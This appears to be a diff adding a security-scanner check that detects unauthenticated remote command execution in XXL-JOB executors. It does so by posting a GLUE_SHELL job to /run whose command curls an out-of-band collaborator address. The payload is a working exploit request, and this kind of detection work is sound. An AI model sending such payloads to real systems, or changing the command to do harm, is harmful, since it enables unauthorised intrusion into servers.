@@ -1,0 +1,24 @@
+metadata:
+    language: v1-beta
+    name: "xxl job rce"
+    description: "xxl job rce detection"
+    author: "timeshatter"
+
+define:
+    poc = `\{"jobId": 66666666,"executorHandler": "demoJobHandler","executorParams":"demoJobHandler","executorBlockStrategy": "COVER_EARLY","executorTimeout": 0, "logId": 1,"logDateTime": 1586629003729,"glueType": "GLUE_SHELL","glueSource": "curl {generate_collaborator_address()}","glueUpdatetime": 1586699003758,"broadcastIndex": 0,"broadcastTotal": 0}`
+
+given request then
+    send request:
+        method: "POST"
+        replacing path: "/run"
+        headers:
+            "Content-Type": "application/json"
+        body: {poc}
+
+    if any interactions then
+        report issue:
+            severity: high
+            confidence: firm
+            detail: "xxl job rce detection."
+            remediation: "Turn on the authentication component that comes with XXL-JOB."
+    end if
